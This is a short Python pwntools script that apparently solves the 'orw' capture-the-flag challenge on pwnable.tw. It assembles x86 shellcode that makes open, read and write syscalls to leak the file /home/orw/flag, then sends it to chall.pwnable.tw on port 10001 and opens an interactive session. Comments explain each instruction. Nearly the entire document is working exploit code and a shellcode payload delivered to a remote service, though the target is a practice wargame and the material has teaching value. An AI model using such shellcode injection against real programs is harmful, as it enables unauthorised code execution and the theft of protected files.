from pwn import *

filename="push 0x6761; push 0x6c662f77; push 0x726f2f65; push 0x6d6f682f"#/home/orw/flag hexadecimal
sys_open=";mov eax,0x5;mov ebx,esp;int 0x80;"#eax is 5, int80 calls open, ebx is the starting position in the stack when reading filename
sys_read="mov eax,0x3;mov ebx,0x3;mov edx,0x30;int 0x80;"  #eax is 3, int80 calls read, the value of ebx is the value of fd, and edx is the value of count
sys_write="mov eax,0x4;mov ebx,0x1;mov edx,0x30;int 0x80;"

shellcode=filename+sys_open+sys_read+sys_write

payload=asm(shellcode)
s=remote('chall.pwnable.tw',10001)
print(s.recv(1024))
s.sendline(payload)

print(s.recv())
s.interactive()


# push 0x6761; ag
# push 0x6c662f77; w/fl
# push 0x726f2f65; e/or
# push 0x6d6f682f /hom
# mov eax,0x5;  sys_open
# mov ebx,esp;  push str
# int 0x80; 
# mov eax,0x3;  sys_read
# mov ebx,0x3;
# mov edx,0x30;
# int 0x80
# mov eax,0x4;  sys_write
# mov ebx,0x1;
# mov edx,0x30;
# int 0x80